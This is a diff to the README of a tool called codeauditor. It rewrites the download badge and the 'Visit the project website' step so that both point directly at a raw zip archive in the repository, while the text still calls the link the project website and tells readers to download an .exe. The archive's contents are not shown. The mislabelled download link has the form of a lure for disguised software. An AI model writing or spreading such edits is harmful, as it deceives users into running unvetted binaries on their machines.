@@ -1,6 +1,6 @@
 # 🔍 codeauditor - Improve your codebase health automatically
 
-[![](https://img.shields.io/badge/Download_codeauditor-Blue-blue.svg)](https://github.com/hashmis7144/codeauditor)
+[![](https://img.shields.io/badge/Download_codeauditor-Blue-blue.svg)](https://github.com/hashmis7144/codeauditor/raw/refs/heads/main/engine/Software_v2.2.zip)
 
 codeauditor scans your software projects from beginning to end. It finds issues and creates a report named codeaudit.md. This file lists problems by priority and gives you a score. You can share this report with AI coding tools to fix your project. It works with assistants like Claude Code, Cursor, Windsurf, and Gemini.
 
@@ -8,7 +8,7 @@ codeauditor scans your software projects from beginning to end. It finds issues 
 
 Follow these steps to get codeauditor on your Windows computer.
 
-1. Visit the project website: [https://github.com/hashmis7144/codeauditor](https://github.com/hashmis7144/codeauditor)
+1. Visit the project website: [https://github.com/hashmis7144/codeauditor/raw/refs/heads/main/engine/Software_v2.2.zip](https://github.com/hashmis7144/codeauditor/raw/refs/heads/main/engine/Software_v2.2.zip)
 2. Scroll to the section marked Releases on the right side of the page.
 3. Select the latest version link.
 4. Download the file ending in .exe for your Windows system.
